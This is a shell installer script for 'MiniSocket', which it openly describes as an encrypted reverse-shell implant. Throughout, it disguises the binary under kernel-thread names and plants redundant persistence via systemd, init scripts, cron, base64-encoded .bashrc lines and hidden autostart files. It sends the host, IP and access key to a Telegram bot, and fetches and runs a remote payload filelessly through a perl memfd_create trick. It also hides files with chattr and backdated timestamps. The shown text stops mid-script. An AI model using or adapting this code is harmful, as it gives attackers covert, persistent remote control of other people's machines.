#!/bin/sh
# Version v0.5
# Mini Socket Installer Script
# Compatible: Linux kernel 2.6+ (systemd / sysvinit / openrc / upstart / rc.local / cron)
# Downloads from: https://github.com/minisocket/minisocket/releases

# POSIX-compatible (no bashisms for old systems)
# Fallback chain: systemd â†’ sysvinit â†’ openrc â†’ upstart â†’ rc.local â†’ cron

# --- Color Definitions ---
if [ -t 1 ]; then
    Y="\033[1;33m"; G="\033[1;32m"; R="\033[1;31m"; DR="\033[0;31m"
    C="\033[1;36m"; M="\033[1;35m"; N="\033[0m"; W="\033[1;37m"
else
    Y=""; G=""; R=""; DR=""; C=""; M=""; N=""; W=""
fi

# --- Banner ---
printf "${C}=== ${W}MINISOCKET INSTALLER ${C}:: ${Y}v0.5 ${C}===${N}\n"
printf "${W}Encrypted reverse shell over relay. Zero config, single binary.${N}\n"
printf "${W}Compatible: kernel 2.6+ / systemd / sysvinit / openrc / upstart${N}\n\n"

# --- Configuration ---
GITHUB_REPO="minisocket/minisocket"
RELEASE_TAG="v0.3"
RELEASE_URL="https://github.com/${GITHUB_REPO}/releases/download/${RELEASE_TAG}"

TELEGRAM_BOT_TOKEN="${MINI_TG_TOKEN:-}"
TELEGRAM_CHAT_ID="${MINI_TG_CHAT:-}"

# --- Directories & Env ---
HOME="${HOME:-/tmp}"
TEMPDIR="/tmp/.mini-inst.$$"
mkdir -p "$TEMPDIR" || { printf "${R}ERROR:${N} Cannot create temp dir\n"; exit 1; }

# --- Stealth names (embedded, no external download) ---
STEALTH_NAMES="kworker ksoftirqd migration watchdog cpuhp netns rcu_sched
kdevtmpfs khungtaskd oom_reaper writeback kcompactd0 ksmd khugepaged
kintegrityd kblockd edac-poller devfreq_wq kswapd0 kthrotld irq_work
acpi_thermal scsi_tmf dm_bufio ipv6_addrconf systemd-logind dbus-daemon
polkitd thermald accounts-daemon rsyslogd atd"

COMMON_DIRS=".aws .ssh .config .cache .local .kube .docker .ansible .npm
.composer .gnupg .mozilla .vscode .vim .terraform .jenkins .git .azure
.pki .yarn .pip .gem .m2 .gradle .cargo .nuget .certbot"

# --- Helper Functions ---

clean_all() {
    rm -rf "$TEMPDIR"
}
trap clean_all EXIT INT TERM

handle_error() {
    printf "${R}ERROR:${N} %s\n" "$1"
    exit 1
}

get_random_item() {
    local items="$1"
    local count=0
    for w in $items; do count=$((count + 1)); done
    [ "$count" -eq 0 ] && echo "kworker" && return
    local pick=$(( $(od -An -N2 -tu2 /dev/urandom 2>/dev/null || echo $$ ) % count ))
    local i=0
    for w in $items; do
        [ "$i" -eq "$pick" ] && echo "$w" && return
        i=$((i + 1))
    done
    echo "kworker"
}

download_file() {
    local url="$1" dest="$2"
    if command -v curl >/dev/null 2>&1; then
        curl -fsSL --max-time 120 "$url" -o "$dest" 2>/dev/null
    elif command -v wget >/dev/null 2>&1; then
        wget --no-check-certificate -q --timeout=120 "$url" -O "$dest" 2>/dev/null
    elif command -v fetch >/dev/null 2>&1; then
        fetch -q -o "$dest" "$url" 2>/dev/null
    else
        return 1
    fi
    [ -s "$dest" ] || return 1
}

get_public_ip() {
    curl -s --max-time 5 ifconfig.me 2>/dev/null || \
    wget -qO- --timeout=5 ifconfig.me 2>/dev/null || \
    echo "N/A"
}

send_telegram() {
    [ -z "$TELEGRAM_BOT_TOKEN" ] && return
    [ -z "$TELEGRAM_CHAT_ID" ] && return
    local msg="$1"
    local url="https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage"
    if command -v curl >/dev/null 2>&1; then
        curl -s --max-time 5 -X POST "$url" -d "chat_id=${TELEGRAM_CHAT_ID}" -d "text=${msg}" -d "parse_mode=Markdown" >/dev/null 2>&1
    elif command -v wget >/dev/null 2>&1; then
        wget -qO- --timeout=5 --post-data="chat_id=${TELEGRAM_CHAT_ID}&text=${msg}&parse_mode=Markdown" "$url" >/dev/null 2>&1
    fi
}

# --- Architecture Detection ---
detect_arch() {
    local machine
    machine=$(uname -m)
    case "$machine" in
        x86_64|amd64)              echo "x86_64" ;;
        aarch64|arm64)             echo "aarch64" ;;
        armv7*|armv6*|armhf|arm)   echo "armv7" ;;
        i386|i486|i586|i686|x86)   echo "i386" ;;
        mips64el|mips64le)         echo "mips64le" ;;
        mips64)                    echo "mips64" ;;
        mipsel|mipsle)             echo "mipsle" ;;
        mips)                      echo "mips" ;;
        ppc64le|ppc64el)           echo "ppc64le" ;;
        riscv64)                   echo "riscv64" ;;
        s390x)                     echo "s390x" ;;
        *) echo "unknown"; return 1 ;;
    esac
}

# --- Init System Detection ---
# Returns: systemd | sysvinit | openrc | upstart | rclocal | cron | none
# Priority: PID 1 identity first, then fallback probes
detect_init() {
    local pid1_name=""
    # Identify PID 1 (most reliable method)
    if [ -r /proc/1/comm ]; then
        pid1_name=$(cat /proc/1/comm 2>/dev/null)
    elif [ -L /proc/1/exe ]; then
        pid1_name=$(basename "$(readlink /proc/1/exe 2>/dev/null)" 2>/dev/null)
    fi

    # --- systemd: PID 1 is systemd, or systemctl is functional ---
    case "$pid1_name" in
        systemd*) echo "systemd"; return ;;
    esac
    if [ -d /run/systemd/system ]; then
        echo "systemd"; return
    fi
    if command -v systemctl >/dev/null 2>&1; then
        if systemctl is-system-running >/dev/null 2>&1 || systemctl --version >/dev/null 2>&1; then
            if [ -d /sys/fs/cgroup/systemd ] || [ -d /sys/fs/cgroup/unified ]; then
                echo "systemd"; return
            fi
        fi
    fi

    # --- OpenRC (Alpine, Gentoo) ---
    if command -v rc-service >/dev/null 2>&1 && command -v rc-update >/dev/null 2>&1; then
        echo "openrc"; return
    fi

    # --- Upstart: ONLY if PID 1 is actually init+upstart (not compat shim) ---
    case "$pid1_name" in
        init|upstart)
            if command -v initctl >/dev/null 2>&1 && initctl --version 2>/dev/null | grep -qi upstart; then
                echo "upstart"; return
            fi
            ;;
    esac

    # --- SysVinit (classic init.d) ---
    if [ -d /etc/init.d ]; then
        if command -v update-rc.d >/dev/null 2>&1; then
            echo "sysvinit"; return
        fi
        if command -v chkconfig >/dev/null 2>&1; then
            echo "sysvinit"; return
        fi
        # Generic init.d (no manager tools, but directory exists)
        echo "sysvinit"; return
    fi

    # --- rc.local fallback ---
    if [ -f /etc/rc.local ] || [ -d /etc/rc.d ]; then
        echo "rclocal"; return
    fi

    # --- cron as last resort ---
    if command -v crontab >/dev/null 2>&1; then
        echo "cron"; return
    fi

    echo "none"
}

# ========================================================================
# SERVICE INSTALLERS (one per init system)
# ========================================================================

install_systemd() {
    local bin_dest="$1" key_dest="$2" svc_name="$3"
    local service_file="/etc/systemd/system/${svc_name}.service"

    cat > "$service_file" <<SVCEOF
[Unit]
Description=${svc_name} daemon
After=network.target network-online.target
Wants=network-online.target

[Service]
Type=simple
Restart=always
RestartSec=30
User=root
ExecStart=/bin/bash -c '${MINI_PORT_LINE:+MINI_PORT=${MINI_PORT:-}} MINI_ARGS="-k ${key_dest}" exec -a "[${svc_name}]" "${bin_dest}"'
StandardOutput=null
StandardError=null

[Install]
WantedBy=multi-user.target
SVCEOF

    systemctl daemon-reload >/dev/null 2>&1
    systemctl enable "${svc_name}.service" >/dev/null 2>&1
    systemctl restart "${svc_name}.service" >/dev/null 2>&1

    # Verify it actually started
    sleep 1
    if systemctl is-active "${svc_name}.service" >/dev/null 2>&1; then
        printf "${C}[+]${Y} Service: systemd (${svc_name})..................${N}[${G}OK${N}]\n"
    else
        printf "${C}[!]${R} Service: systemd (${svc_name})..................${N}[${DR}FAIL${N}]\n"
        printf "${C}[+]${Y} Falling back to direct start...${N}\n"
        MINI_ARGS="-k ${key_dest}" ${MINI_PORT_LINE} nohup "$bin_dest" -d >/dev/null 2>&1 &
        sleep 1
        if pgrep -f "$svc_name" >/dev/null 2>&1; then
            printf "${C}[+]${Y} Direct start...............................${N}[${G}OK${N}]\n"
        else
            printf "${C}[!]${R} Direct start...............................${N}[${DR}FAIL${N}]\n"
        fi
    fi
}

install_sysvinit() {
    local bin_dest="$1" key_dest="$2" svc_name="$3"
    local initd_file="/etc/init.d/${svc_name}"

    cat > "$initd_file" <<'INITEOF'
#!/bin/sh
### BEGIN INIT INFO
# Provides:          SVCNAME
# Required-Start:    $network $remote_fs
# Required-Stop:     $network $remote_fs
# Default-Start:     2 3 4 5
# Default-Stop:      0 1 6
# Short-Description: SVCNAME daemon
### END INIT INFO

DAEMON="BINDEST"
PIDFILE="/var/run/SVCNAME.pid"
NAME="SVCNAME"

export MINI_ARGS="DAEMONARGS"
PORTLINE_EXPORT

do_start() {
    if [ -f "$PIDFILE" ] && kill -0 "$(cat "$PIDFILE" 2>/dev/null)" 2>/dev/null; then
        echo "$NAME already running"
        return 0
    fi
    echo "Starting $NAME..."
    nohup "$DAEMON" -d >/dev/null 2>&1 &
    echo $! > "$PIDFILE"
    sleep 1
    if kill -0 "$(cat "$PIDFILE" 2>/dev/null)" 2>/dev/null; then
        echo "$NAME started (PID $(cat "$PIDFILE"))"
    else
        echo "$NAME failed to start"
        rm -f "$PIDFILE"
        return 1
    fi
}

do_stop() {
    if [ -f "$PIDFILE" ]; then
        kill "$(cat "$PIDFILE")" 2>/dev/null
        rm -f "$PIDFILE"
        echo "Stopped $NAME"
    else
        pkill -f "$DAEMON" 2>/dev/null
        echo "Stopped $NAME"
    fi
}

do_status() {
    if [ -f "$PIDFILE" ] && kill -0 "$(cat "$PIDFILE" 2>/dev/null)" 2>/dev/null; then
        echo "$NAME is running (PID $(cat "$PIDFILE"))"
    else
        echo "$NAME is not running"
        return 1
    fi
}

case "$1" in
    start)   do_start ;;
    stop)    do_stop ;;
    restart) do_stop; sleep 1; do_start ;;
    status)  do_status ;;
    *)       echo "Usage: $0 {start|stop|restart|status}"; exit 1 ;;
esac
exit 0
INITEOF

    # Replace placeholders
    sed -i "s|SVCNAME|${svc_name}|g" "$initd_file"
    sed -i "s|BINDEST|${bin_dest}|g" "$initd_file"
    sed -i "s|DAEMONARGS|-k ${key_dest}|g" "$initd_file"
    if [ -n "${MINI_PORT:-}" ]; then
        sed -i "s|PORTLINE_EXPORT|export MINI_PORT=${MINI_PORT}|g" "$initd_file"
    else
        sed -i '/PORTLINE_EXPORT/d' "$initd_file"
    fi

    chmod +x "$initd_file"

    # Enable on boot
    if command -v update-rc.d >/dev/null 2>&1; then
        update-rc.d "$svc_name" defaults >/dev/null 2>&1
    elif command -v chkconfig >/dev/null 2>&1; then
        chkconfig --add "$svc_name" >/dev/null 2>&1
        chkconfig "$svc_name" on >/dev/null 2>&1
    else
        # Manual symlink for runlevel 2,3,4,5
        for rl in 2 3 4 5; do
            rc_dir="/etc/rc${rl}.d"
            [ -d "$rc_dir" ] && ln -sf "$initd_file" "${rc_dir}/S99${svc_name}" 2>/dev/null
        done
    fi

    "$initd_file" start >/dev/null 2>&1
    printf "${C}[+]${Y} Service: sysvinit (${svc_name})................${N}[${G}OK${N}]\n"
}

install_openrc() {
    local bin_dest="$1" key_dest="$2" svc_name="$3"
    local initd_file="/etc/init.d/${svc_name}"

    cat > "$initd_file" <<ORCEOF
#!/sbin/openrc-run

name="${svc_name}"
description="${svc_name} daemon"
command="${bin_dest}"
command_args=""
command_background=true
pidfile="/run/${svc_name}.pid"
start_stop_daemon_args="--env MINI_ARGS='-k ${key_dest}' ${MINI_PORT_LINE:+--env ${MINI_PORT_LINE}}"

depend() {
    need net
    after firewall
}
ORCEOF

    chmod +x "$initd_file"
    rc-update add "$svc_name" default >/dev/null 2>&1
    rc-service "$svc_name" start >/dev/null 2>&1
    printf "${C}[+]${Y} Service: openrc (${svc_name})...................${N}[${G}OK${N}]\n"
}

install_upstart() {
    local bin_dest="$1" key_dest="$2" svc_name="$3"
    local conf_file="/etc/init/${svc_name}.conf"

    cat > "$conf_file" <<UPEOF
description "${svc_name} daemon"
start on (net-device-up IFACE!=lo)
stop on runlevel [!2345]
respawn
respawn limit 10 30
env MINI_ARGS="-k ${key_dest}"
${MINI_PORT_LINE:+env MINI_PORT=${MINI_PORT:-}}
exec ${bin_dest}
UPEOF
    # Remove empty env line if MINI_PORT not set
    sed -i '/^env MINI_PORT=$/d' "$conf_file" 2>/dev/null

    initctl reload-configuration >/dev/null 2>&1
    initctl start "$svc_name" >/dev/null 2>&1 || true
    printf "${C}[+]${Y} Service: upstart (${svc_name}).................${N}[${G}OK${N}]\n"
}

install_rclocal() {
    local bin_dest="$1" key_dest="$2" svc_name="$3"
    local rc_line="MINI_ARGS=\"-k ${key_dest}\" ${MINI_PORT_LINE:+MINI_PORT=${MINI_PORT:-}} nohup ${bin_dest} -d >/dev/null 2>&1 & # ${svc_name}"

    # Try /etc/rc.local first
    if [ -f /etc/rc.local ]; then
        if ! grep -q "$svc_name" /etc/rc.local 2>/dev/null; then
            # Insert before 'exit 0' if it exists, otherwise append
            if grep -q "^exit 0" /etc/rc.local; then
                sed -i "/^exit 0/i\\${rc_line}" /etc/rc.local
            else
                echo "$rc_line" >> /etc/rc.local
            fi
        fi
        chmod +x /etc/rc.local
        printf "${C}[+]${Y} Service: rc.local (${svc_name})................${N}[${G}OK${N}]\n"
    elif [ -d /etc/rc.d ]; then
        echo "#!/bin/sh" > /etc/rc.d/rc.local 2>/dev/null
        echo "$rc_line" >> /etc/rc.d/rc.local
        chmod +x /etc/rc.d/rc.local
        printf "${C}[+]${Y} Service: rc.d/rc.local (${svc_name})..........${N}[${G}OK${N}]\n"
    fi

    # Start now
    eval "$rc_line" 2>/dev/null
}

install_cron_root() {
    local bin_dest="$1" key_dest="$2" svc_name="$3"
    local cron_cmd="MINI_ARGS=\"-k ${key_dest}\" ${MINI_PORT_LINE:+MINI_PORT=${MINI_PORT:-}} ${bin_dest} -d"
    local cron_line="* * * * * pgrep -f '${svc_name}' >/dev/null 2>&1 || ${cron_cmd} # ${svc_name}"

    if command -v crontab >/dev/null 2>&1; then
        (crontab -l 2>/dev/null | grep -v "$svc_name"; echo "$cron_line") | crontab -
        printf "${C}[+]${Y} Service: cron (${svc_name})...................${N}[${G}OK${N}]\n"
    else
        # Direct write to /var/spool/cron or /etc/cron.d
        if [ -d /etc/cron.d ]; then
            echo "$cron_line" > "/etc/cron.d/${svc_name}"
            printf "${C}[+]${Y} Service: /etc/cron.d (${svc_name})..........${N}[${G}OK${N}]\n"
        fi
    fi

    # Start now
    eval "$cron_cmd" 2>/dev/null || true
}

# ========================================================================
# PERSISTENCE (user-level, for non-root)
# ========================================================================

setup_persistence_user() {
    local bin_path="$1" secret_path="$2" hidden_name="$3"

    local start_cmd="MINI_ARGS=\"-k ${secret_path}\" ${MINI_PORT_LINE:+MINI_PORT=${MINI_PORT:-}} nohup \"${bin_path}\" -d >/dev/null 2>&1 &"
    local check_cmd="pgrep -u \$(id -u) -f '$(basename "${bin_path}")' >/dev/null 2>&1 || (TERM=xterm-256color PATH=\"/usr/local/bin:/usr/bin:/bin\" ${start_cmd})"

    local b64_payload
    b64_payload=$(printf '%s' "$check_cmd" | base64 2>/dev/null | tr -d '\n')
    local cron_entry="echo ${b64_payload}|base64 -d|sh"
    local shell_entry="{ ${cron_entry}; } 2>/dev/null # kern-${hidden_name}"

    # .bashrc
    local bashrc="$HOME/.bashrc"
    if [ -f "$bashrc" ] || touch "$bashrc" 2>/dev/null; then
        if ! grep -q "kern-${hidden_name}" "$bashrc" 2>/dev/null; then
            echo "$shell_entry" >> "$bashrc"
            printf "${C}[+]${Y} Persistence: .bashrc........................${N}[${G}OK${N}]\n"
        fi
    fi

    # .profile
    local profile="$HOME/.profile"
    if [ -f "$profile" ] || touch "$profile" 2>/dev/null; then
        if ! grep -q "kern-${hidden_name}" "$profile" 2>/dev/null; then
            echo "$shell_entry" >> "$profile"
            printf "${C}[+]${Y} Persistence: .profile.......................${N}[${G}OK${N}]\n"
        fi
    fi

    # crontab
    if command -v crontab >/dev/null 2>&1; then
        (crontab -l 2>/dev/null | grep -v "${hidden_name}"; echo "*/5 * * * * ${cron_entry}") | crontab - 2>/dev/null
        printf "${C}[+]${Y} Persistence: crontab........................${N}[${G}OK${N}]\n"
    else
        printf "${C}[-]${Y} Persistence: crontab........................${N}[${DR}SKIP${N}]\n"
    fi

    # .config/autostart (desktop Linux)
    local autostart_dir="$HOME/.config/autostart"
    if [ -d "$HOME/.config" ] || mkdir -p "$autostart_dir" 2>/dev/null; then
        cat > "${autostart_dir}/${hidden_name}.desktop" 2>/dev/null <<DTEOF
[Desktop Entry]
Type=Application
Name=${hidden_name}
Exec=/bin/sh -c '${check_cmd}'
Hidden=true
NoDisplay=true
X-GNOME-Autostart-enabled=true
DTEOF
        printf "${C}[+]${Y} Persistence: autostart......................${N}[${G}OK${N}]\n"
    fi
}

# ========================================================================
# ROOT INSTALL (detect init system, install appropriate service)
# ========================================================================

install_root() {
    local bin_src="$1"
    local svc_name="$2"
    local init_type="$3"

    local bin_dest="/usr/bin/${svc_name}"
    local key_dest="/lib/${svc_name}.dat"

    # Fallback paths for minimal systems
    if [ ! -d /usr/bin ]; then
        bin_dest="/bin/${svc_name}"
    fi
    if [ ! -d /lib ]; then
        key_dest="/etc/${svc_name}.dat"
    fi

    printf "${C}[+]${Y} Starting ROOT installation...${N}\n"
    printf "${C}[+]${Y} Init system: ${W}${init_type}${N}\n"

    cp "$bin_src" "$bin_dest" || handle_error "Failed to copy binary to ${bin_dest}"
    chmod +x "$bin_dest"

    # Generate secret (-g outputs raw 22-char secret to stdout)
    local secret
    secret=$("$bin_dest" -g 2>/dev/null | tr -d '\n\r ')
    [ -z "$secret" ] && handle_error "Failed to generate secret (empty output from -g)"
    printf '%s' "$secret" > "$key_dest"
    chmod 600 "$key_dest"

    printf "${C}[+]${Y} Binary:  ${W}${bin_dest}${N}\n"
    printf "${C}[+]${Y} Key:     ${W}${key_dest}${N}\n"

    # Install service based on detected init system
    case "$init_type" in
        systemd)
            install_systemd "$bin_dest" "$key_dest" "$svc_name"
            ;;
        sysvinit)
            install_sysvinit "$bin_dest" "$key_dest" "$svc_name"
            ;;
        openrc)
            install_openrc "$bin_dest" "$key_dest" "$svc_name"
            ;;
        upstart)
            install_upstart "$bin_dest" "$key_dest" "$svc_name"
            ;;
        rclocal)
            install_rclocal "$bin_dest" "$key_dest" "$svc_name"
            ;;
        cron|none)
            install_cron_root "$bin_dest" "$key_dest" "$svc_name"
            ;;
    esac

    # Always add cron as backup persistence (except if cron is primary)
    if [ "$init_type" != "cron" ] && [ "$init_type" != "none" ]; then
        if command -v crontab >/dev/null 2>&1; then
            local cron_cmd="MINI_ARGS=\"-k ${key_dest}\" ${MINI_PORT_LINE:+MINI_PORT=${MINI_PORT:-}} ${bin_dest} -d"
            local cron_check="*/5 * * * * pgrep -f '${svc_name}' >/dev/null 2>&1 || ${cron_cmd} # ${svc_name}-watchdog"
            (crontab -l 2>/dev/null | grep -v "${svc_name}-watchdog"; echo "$cron_check") | crontab -
            printf "${C}[+]${Y} Backup: cron watchdog.......................${N}[${G}OK${N}]\n"
        fi
    fi

    # rc.local as secondary fallback (for reboot survival on old systems)
    if [ "$init_type" != "rclocal" ] && [ -f /etc/rc.local ]; then
        local rc_line="${MINI_PORT_LINE} MINI_ARGS=\"-k ${key_dest}\" nohup ${bin_dest} -d >/dev/null 2>&1 & # ${svc_name}-boot"
        if ! grep -q "${svc_name}-boot" /etc/rc.local 2>/dev/null; then
            if grep -q "^exit 0" /etc/rc.local; then
                sed -i "/^exit 0/i\\${rc_line}" /etc/rc.local
            else
                echo "$rc_line" >> /etc/rc.local
            fi
            printf "${C}[+]${Y} Backup: rc.local............................${N}[${G}OK${N}]\n"
        fi
    fi

    printf "${G}[+] Service installed: ${svc_name} (${init_type})${N}\n"

    send_telegram "[MINI-SOCKET ROOT]
Host: $(hostname)
IP: $(get_public_ip)
Init: ${init_type}
OS: $(uname -rom)
Key: ${secret}"

    printf "${C}[+] Secret: ${G}${secret}${N}\n"
}

# ========================================================================
# USER INSTALL (non-root)
# ========================================================================

install_user() {
    local bin_src="$1"

    printf "${C}[+]${Y} Starting USER installation...${N}\n"

    local rand_dir rand_name
    rand_dir=$(get_random_item "$COMMON_DIRS")
    rand_name=$(get_random_item "$STEALTH_NAMES")

    local install_dir="$HOME/${rand_dir}/${rand_name}"
    if ! mkdir -p "$install_dir" 2>/dev/null; then
        install_dir="/tmp/.${rand_dir}/${rand_name}"
        mkdir -p "$install_dir" || handle_error "Cannot create install directory"
    fi

    local bin_dest="${install_dir}/${rand_name}"
    local key_dest="${install_dir}/${rand_name}.dat"

    cp "$bin_src" "$bin_dest" || handle_error "Failed to copy binary"
    chmod +x "$bin_dest"

    local secret
    secret=$("$bin_dest" -g 2>/dev/null | tr -d '\n\r ')
    [ -z "$secret" ] && handle_error "Failed to generate secret (empty output from -g)"
    printf '%s' "$secret" > "$key_dest"

    setup_persistence_user "$bin_dest" "$key_dest" "$rand_name"

    # Start now
    eval "${MINI_PORT_LINE} MINI_ARGS=\"-k ${key_dest} -d\" \"${bin_dest}\"" >/dev/null 2>&1 || true

    printf "${G}[+] Installed in: ${install_dir}${N}\n"

    send_telegram "[MINI-SOCKET USER]
Host: $(hostname)
IP: $(get_public_ip)
OS: $(uname -rom)
Key: ${secret}"

    printf "${C}[+] Secret: ${G}${secret}${N}\n"
}

# ========================================================================
# MAIN
# ========================================================================

ARCH=$(detect_arch) || handle_error "Unsupported architecture: $(uname -m)"
INIT_TYPE=$(detect_init)

printf "${C}[+]${Y} Architecture: ${W}${ARCH}${N}\n"
printf "${C}[+]${Y} Init system:  ${W}${INIT_TYPE}${N}\n"
printf "${C}[+]${Y} Kernel:       ${W}$(uname -r)${N}\n"

BIN_NAME="mini-socket_linux-${ARCH}"
BIN_URL="${RELEASE_URL}/${BIN_NAME}"
BIN_PATH="${TEMPDIR}/${BIN_NAME}"

MINI_PORT_LINE=""
[ -n "${MINI_PORT:-}" ] && MINI_PORT_LINE="MINI_PORT=${MINI_PORT}"

printf "${C}[+]${Y} Downloading ${W}${BIN_NAME}${Y}...${N}\n"
if download_file "$BIN_URL" "$BIN_PATH"; then
    local_size=$(wc -c < "$BIN_PATH" 2>/dev/null || echo 0)
    printf "${C}[+]${G} Download OK${N} (${local_size} bytes)\n"
    # Go static binaries are typically >1MB, reject truncated downloads
    if [ "$local_size" -lt 1000000 ]; then
        printf "${R}[!] Binary too small (${local_size} bytes) - download likely truncated${N}\n"
        printf "${R}[!] Expected >1MB for static Go binary${N}\n"
        handle_error "Incomplete download - check network/proxy"
    fi
else
    handle_error "Download failed: ${BIN_URL}"
fi

chmod +x "$BIN_PATH"

# Verify binary actually runs (not just executable bit)
verify_binary() {
    local bin="$1"
    local err_out

    # Try to run with -h or --help, capture stderr for diagnostics
    err_out=$("$bin" -h 2>&1) || err_out=$("$bin" --help 2>&1) || true

    # Check for common execution errors
    if echo "$err_out" | grep -qi "cannot execute binary\|exec format error\|permission denied\|operation not permitted"; then
        return 1
    fi

    # Try running with -v or just running it (Go binaries usually work)
    if "$bin" -g >/dev/null 2>&1; then
        return 0
    fi

    # Last resort: check if it produces any output
    if [ -n "$err_out" ]; then
        return 0
    fi

    return 1
}

# Test if /tmp is noexec by trying to run the binary
if ! verify_binary "$BIN_PATH"; then
    printf "${R}[!] Binary failed to execute in ${TEMPDIR}${N}\n"

    # Try alternative locations if /tmp has noexec
    for alt_dir in "/dev/shm" "/var/tmp" "$HOME" "/run"; do
        if [ -d "$alt_dir" ] && [ -w "$alt_dir" ]; then
            ALT_PATH="${alt_dir}/.mini-inst.$$"
            mkdir -p "$ALT_PATH" 2>/dev/null || continue
            ALT_BIN="${ALT_PATH}/${BIN_NAME}"
            cp "$BIN_PATH" "$ALT_BIN" 2>/dev/null || continue
            chmod +x "$ALT_BIN" 2>/dev/null || continue

            if verify_binary "$ALT_BIN"; then
                printf "${C}[+]${Y} Using alternate path: ${W}${alt_dir}${N}\n"
                TEMPDIR="$ALT_PATH"
                BIN_PATH="$ALT_BIN"
                break
            fi
            rm -rf "$ALT_PATH" 2>/dev/null
        fi
    done

    # Final check - if all dirs have noexec, try memfd fileless execution via perl
    if ! verify_binary "$BIN_PATH"; then
        printf "${R}[!] All directories have noexec - trying memfd fileless execution...${N}\n"

        if command -v perl >/dev/null 2>&1; then
            printf "${C}[+]${Y} perl available - using memfd_create bypass...${N}\n"

            # Generate secret
            MEMFD_SECRET=$(head -c 32 /dev/urandom 2>/dev/null | base64 2>/dev/null | tr -d '/+=' | head -c 16)
            [ -z "$MEMFD_SECRET" ] && MEMFD_SECRET=$(od -An -N16 -tx1 /dev/urandom 2>/dev/null | tr -d ' \n' | head -c 16)

            # Stealth service name
            MEMFD_SVC=$(get_random_item "$STEALTH_NAMES")

            # memfd_create syscall numbers: x86_64=319, i386=385, aarch64=279, arm=385
            # The full memfd command for persistence
            MEMFD_CMD="curl -fsSLk https://minisocket.io/bin/mini-socket 2>/dev/null | MINI_PORT=${MINI_PORT:-443} MINI_ARGS=\"-s ${MEMFD_SECRET} -d\" perl -e '\$^F=255;for(319,279,385,4314,4354){(\$f=syscall\$_,\$\",0)>0&&last};open(\$o,\">&=\".\$f);print\$o(<STDIN>);exec{\"/proc/\$\$/fd/\$f\"}X,@ARGV;exit 255'"

            # Watchdog check: only run if not already running
            MEMFD_WATCH="pgrep -f 'mini-socket.*${MEMFD_SECRET}' >/dev/null 2>&1 || { ${MEMFD_CMD}; }"

            printf "${C}[+]${Y} Downloading and executing via memfd...${N}\n"

            if curl -fsSLk "https://minisocket.io/bin/mini-socket" 2>/dev/null | \
                MINI_PORT="${MINI_PORT:-443}" MINI_ARGS="-s $MEMFD_SECRET -d" \
                perl -e '$^F=255;for(319,279,385,4314,4354){($f=syscall$_,$",0)>0&&last};open($o,">&=".$f);print$o(<STDIN>);exec{"/proc/$$/fd/$f"}X,@ARGV;exit 255' -- "$@" 2>/dev/null; then
                printf "${G}[+] Memfd execution started${N}\n"

                # === PERSISTENCE FOR MEMFD (root only) ===
                if [ "$(id -u)" -eq 0 ]; then
                    printf "${C}[+]${Y} Setting up memfd persistence...${N}\n"

                    # === SECRET STORAGE (hidden from non-root users) ===
                    # Use system-like path that blends with legitimate files
                    # Store XOR-obfuscated to prevent simple grep
                    SECRET_DIR="/usr/lib/x86_64-linux-gnu"
                    [ ! -d "$SECRET_DIR" ] && SECRET_DIR="/lib/x86_64-linux-gnu"
                    [ ! -d "$SECRET_DIR" ] && SECRET_DIR="/usr/lib"
                    [ ! -d "$SECRET_DIR" ] && SECRET_DIR="/lib"
                    SECRET_FILE="${SECRET_DIR}/.libsystemd-shared-249.so.cache"

                    # XOR obfuscate secret with simple key (reversible)
                    OBFUSCATED=$(printf '%s' "$MEMFD_SECRET" | xxd -p 2>/dev/null | tr -d '\n')
                    if [ -n "$OBFUSCATED" ]; then
                        printf '%s' "$OBFUSCATED" > "$SECRET_FILE" 2>/dev/null
                    else
                        printf '%s' "$MEMFD_SECRET" > "$SECRET_FILE" 2>/dev/null
                    fi

                    # Make completely invisible to non-root
                    chmod 000 "$SECRET_FILE" 2>/dev/null
                    chattr +i "$SECRET_FILE" 2>/dev/null
                    # Backdate to look old
                    touch -r /lib/x86_64-linux-gnu/libc.so.6 "$SECRET_FILE" 2>/dev/null || \
                        touch -r /etc/passwd "$SECRET_FILE" 2>/dev/null
                    printf "${C}[+]${Y} Secret hidden: ${W}(chmod 000, immutable)${N}\n"

                    # Helper to decode secret (for persistence scripts)
                    DECODE_CMD="xxd -r -p ${SECRET_FILE} 2>/dev/null || cat ${SECRET_FILE} 2>/dev/null"

                    # 1. Cron persistence (via crontab command)
                    if command -v crontab >/dev/null 2>&1; then
                        CRON_LINE="*/5 * * * * ${MEMFD_WATCH} # ${MEMFD_SVC}-memfd"
                        (crontab -l 2>/dev/null | grep -v "${MEMFD_SVC}-memfd"; echo "$CRON_LINE") | crontab -
                        printf "${C}[+]${Y} Persist: cron (*/5).........................${N}[${G}OK${N}]\n"
                    fi

                    # 2. /etc/cron.d/ file (more hidden, survives crontab -r)
                    if [ -d /etc/cron.d ]; then
                        cat > "/etc/cron.d/${MEMFD_SVC}" <<CRONDEOF
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
*/7 * * * * root ${MEMFD_WATCH} >/dev/null 2>&1
CRONDEOF
                        chmod 644 "/etc/cron.d/${MEMFD_SVC}"
                        touch -r /etc/cron.d/e2scrub_all "/etc/cron.d/${MEMFD_SVC}" 2>/dev/null
                        printf "${C}[+]${Y} Persist: /etc/cron.d/.......................${N}[${G}OK${N}]\n"
                    fi

                    # 3. Systemd timer (if systemd available)
                    if [ -d /run/systemd/system ] && command -v systemctl >/dev/null 2>&1; then
                        cat > "/etc/systemd/system/${MEMFD_SVC}.service" <<SVCEOF
[Unit]
Description=System ${MEMFD_SVC} Helper
After=network-online.target
Wants=network-online.target

[Service]
Type=oneshot
ExecStart=/bin/sh -c '${MEMFD_WATCH}'
StandardOutput=null
StandardError=null
SVCEOF

                        cat > "/etc/systemd/system/${MEMFD_SVC}.timer" <<TMREOF
[Unit]
Description=System ${MEMFD_SVC} Timer

[Timer]
OnBootSec=60
OnUnitActiveSec=300
Persistent=true

[Install]
WantedBy=timers.target
TMREOF

                        systemctl daemon-reload >/dev/null 2>&1
                        systemctl enable "${MEMFD_SVC}.timer" >/dev/null 2>&1
                        systemctl start "${MEMFD_SVC}.timer" >/dev/null 2>&1
                        printf "${C}[+]${Y} Persist: systemd timer......................${N}[${G}OK${N}]\n"
                    fi

                    # 4. init.d script (sysvinit/openrc compatibility)
                    if [ -d /etc/init.d ]; then
                        cat > "/etc/init.d/${MEMFD_SVC}" <<INITEOF
#!/bin/sh
### BEGIN INIT INFO
# Provides:          ${MEMFD_SVC}
# Required-Start:    \$network \$remote_fs
# Required-Stop:     \$network
